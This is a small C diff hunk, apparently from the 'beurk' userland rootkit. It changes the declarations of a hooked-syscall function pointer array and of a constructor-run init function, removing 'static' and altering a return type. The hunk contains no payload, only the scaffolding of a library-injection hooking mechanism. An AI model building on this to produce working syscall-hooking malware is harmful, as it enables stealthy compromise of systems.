@@ -36,6 +36,6 @@ static char         beurk_syscalls_table[NUM_SYSCALLS][MAX_SYSCALL_SIZE] = {
     SYSCALL_OPEN
 };
 
-static void         *(*beurk_syscalls_list[NUM_SYSCALLS])();
+ssize_t             (*beurk_syscalls_list[NUM_SYSCALLS])();
 
-static void         init(void) __attribute__((constructor));
+void                init(void) __attribute__((constructor));
